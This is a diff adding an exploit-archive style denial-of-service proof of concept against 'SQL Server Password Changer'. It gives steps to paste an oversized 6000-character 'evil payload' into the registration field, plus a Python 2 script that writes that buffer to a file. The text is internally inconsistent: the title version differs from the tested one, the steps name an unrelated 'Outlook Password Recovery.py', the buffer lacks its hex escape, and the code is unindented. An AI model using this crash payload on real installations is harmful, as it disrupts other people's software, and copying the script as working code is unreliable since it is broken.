@@ -1,0 +1,26 @@
+#Exploit Title: SQL Server Password Changer v1.90 Denial of Service Exploit
+# Date: 29.08.2019
+# Vendor Homepage:https://www.top-password.com/
+# Exploit Author: Velayutham Selvaraj & Praveen Thiyagarayam (TwinTech Solutions)
+# Tested Version: v2.10
+# Tested on: Windows 8 x64
+# Windows 7 x64
+
+
+# 1.- Run python code :Outlook Password Recovery.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open SQL Server Password Changer and Click 'EnterKey'
+# 4.- Paste the content of EVIL.txt into the Field: 'User Name and Registration Code'
+# 5.- Click 'OK' and you will see a crash.
+
+#!/usr/bin/env python
+buffer = "x41" * 6000
+
+try:
+f=open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
